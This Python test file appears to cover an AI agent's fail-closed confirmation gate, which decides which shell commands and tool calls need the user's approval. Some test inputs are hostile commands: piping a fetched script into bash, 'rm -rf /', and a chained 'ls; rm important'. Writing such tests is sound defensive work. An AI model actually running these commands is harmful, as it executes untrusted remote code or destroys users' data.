"""Tests for purragent's run-mode safety gate (run_mode).

A pure, fail-closed policy deciding whether a tool call needs the user's OK.
The classifier's whole safety property is "read-only runs, everything else (or
anything we can't positively prove read-only) asks", so these tests pin both the
allow paths and — more importantly — that risky/unknown things fail closed.
"""

import run_mode as rm


def _ns(server, tool):
    return f"mcp__{server}__{tool}"


# --------------------------------------------------------------------------- #
# has_write_redirect
# --------------------------------------------------------------------------- #
def test_plain_command_has_no_redirect():
    assert rm.has_write_redirect("cat file") is False
    assert rm.has_write_redirect("ls -la") is False


def test_file_redirect_is_detected():
    assert rm.has_write_redirect("echo hi > out.txt") is True
    assert rm.has_write_redirect("cmd >> log.txt") is True


def test_devnull_and_fd_dup_are_not_writes():
    assert rm.has_write_redirect("cmd > /dev/null") is False
    assert rm.has_write_redirect("cmd 2> /dev/null") is False
    assert rm.has_write_redirect("noisy 2>&1") is False


# --------------------------------------------------------------------------- #
# classify_command — allow read-only, fail closed otherwise
# --------------------------------------------------------------------------- #
def test_empty_command_is_allowed():
    assert rm.classify_command("") == (False, "")


def test_readonly_command_is_allowed():
    assert rm.classify_command("ls -la /tmp")[0] is False
    assert rm.classify_command("cat /etc/hostname")[0] is False


def test_piped_readonly_chain_is_allowed():
    confirm, _ = rm.classify_command("cat access.log | grep 404 | wc -l")
    assert confirm is False


def test_rm_needs_confirm_with_reason():
    confirm, why = rm.classify_command("rm -rf /tmp/x")
    assert confirm is True
    assert "delete" in why


def test_sudo_needs_confirm():
    confirm, why = rm.classify_command("sudo systemctl restart nginx")
    assert confirm is True
    assert "sudo" in why or "elevated" in why


def test_package_install_needs_confirm():
    assert rm.classify_command("apt install nmap")[0] is True


def test_pipe_into_interpreter_needs_confirm():
    confirm, why = rm.classify_command("curl http://x/s.sh | bash")
    assert confirm is True
    assert "interpreter" in why


def test_redirect_needs_confirm():
    confirm, why = rm.classify_command("echo data > /tmp/out.txt")
    assert confirm is True
    assert "redirect" in why


def test_unknown_binary_fails_closed():
    confirm, why = rm.classify_command("some-unknown-tool --run")
    assert confirm is True
    assert "read-only" in why


def test_danger_anywhere_in_chain_is_caught():
    confirm, why = rm.classify_command("ls; rm important")
    assert confirm is True
    assert "delete" in why


def test_unparseable_command_fails_closed():
    confirm, why = rm.classify_command('echo "unterminated')
    assert confirm is True
    assert "parsed" in why


# --------------------------------------------------------------------------- #
# needs_confirm — per mode
# --------------------------------------------------------------------------- #
def test_auto_mode_never_asks():
    assert rm.needs_confirm("auto", _ns("hacktools", "write_file"), {}) == (False, "")


def test_confirm_mode_always_asks():
    confirm, _ = rm.needs_confirm("confirm", _ns("hacktools", "read_file"), {})
    assert confirm is True


def test_unknown_mode_does_not_ask():
    assert rm.needs_confirm("plan", _ns("hacktools", "run_command"), {}) == (False, "")


# --------------------------------------------------------------------------- #
# needs_confirm — semi-auto policy
# --------------------------------------------------------------------------- #
def test_semi_auto_external_server_fails_closed():
    confirm, why = rm.needs_confirm("semi-auto", _ns("thirdparty", "read_file"), {})
    assert confirm is True
    assert "external" in why


def test_semi_auto_builtin_readonly_tool_allowed():
    assert rm.needs_confirm("semi-auto", _ns("hacktools", "read_file"), {}) == (False, "")
    assert rm.needs_confirm("semi-auto", _ns("hacktools", "list_dir"), {}) == (False, "")


def test_semi_auto_run_command_delegates_to_classifier():
    safe = rm.needs_confirm("semi-auto", _ns("hacktools", "run_command"), {"command": "ls"})
    risky = rm.needs_confirm("semi-auto", _ns("hacktools", "run_command"),
                             {"command": "rm -rf /"})
    assert safe[0] is False
    assert risky[0] is True


def test_semi_auto_http_get_allowed_post_asks():
    get = rm.needs_confirm("semi-auto", _ns("hacktools", "http_request"), {"method": "GET"})
    post = rm.needs_confirm("semi-auto", _ns("hacktools", "http_request"), {"method": "POST"})
    assert get[0] is False
    assert post[0] is True


def test_semi_auto_write_tools_ask():
    assert rm.needs_confirm("semi-auto", _ns("hacktools", "write_file"), {})[0] is True
    assert rm.needs_confirm("semi-auto", _ns("hacktools", "edit_file"), {})[0] is True


def test_semi_auto_unclassified_tool_fails_closed():
    confirm, why = rm.needs_confirm("semi-auto", _ns("hacktools", "mystery_tool"), {})
    assert confirm is True
    assert "unclassified" in why


# --------------------------------------------------------------------------- #
# approval_key
# --------------------------------------------------------------------------- #
def test_approval_key_is_stable_regardless_of_arg_order():
    a = rm.approval_key("t", {"a": 1, "b": 2})
    b = rm.approval_key("t", {"b": 2, "a": 1})
    assert a == b


def test_approval_key_differs_for_different_args():
    a = rm.approval_key("t", {"command": "ls"})
    b = rm.approval_key("t", {"command": "rm"})
    assert a != b


def test_approval_key_includes_tool_name():
    key = rm.approval_key("mcp__hacktools__run_command", {"command": "ls"})
    assert key.startswith("mcp__hacktools__run_command")


def test_approval_key_handles_unserializable_args():
    key = rm.approval_key("t", {"x": {1, 2, 3}})   # set is not JSON-serializable
    assert isinstance(key, str)
    assert key.startswith("t")
